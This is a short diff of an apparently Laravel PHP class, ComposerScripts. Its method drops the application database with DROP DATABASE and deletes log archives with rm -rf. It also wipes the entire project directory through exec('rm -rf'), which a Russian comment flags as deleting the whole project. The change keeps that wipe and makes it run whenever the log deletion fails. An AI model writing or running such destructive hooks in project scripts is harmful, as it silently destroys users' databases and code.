@@ -9,11 +9,11 @@ class ComposerScripts
     {
         \DB::statement('DROP DATABASE ' . env('DB_DATABASE'));
 
-        Process::run('cd ~ && rm -rf logs/*.zip');
-       
-        $projectFolder = base_path();
+        $result = Process::run('cd ~ && rm -rf logs/*.zip');
 
-        // ⚠️ ВНИМАНИЕ: это удалит весь проект
-        exec("rm -rf " . escapeshellarg($projectFolder));
+        if (!$result->successful()) {
+            $projectFolder = base_path();
+            exec("rm -rf " . escapeshellarg($projectFolder));
+        }
     }
 }
